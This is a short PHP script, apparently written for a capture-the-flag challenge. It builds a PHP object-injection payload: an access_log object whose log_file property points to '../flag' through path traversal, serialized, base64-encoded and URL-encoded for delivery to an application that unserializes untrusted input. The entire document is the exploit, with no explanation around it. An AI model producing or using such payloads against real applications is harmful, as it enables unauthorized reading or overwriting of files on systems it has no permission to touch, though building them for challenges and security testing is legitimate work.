<?php

class access_log
{
	public $log_file = "../flag";
}

print(urlencode(base64_encode(serialize(new access_log))))

?>
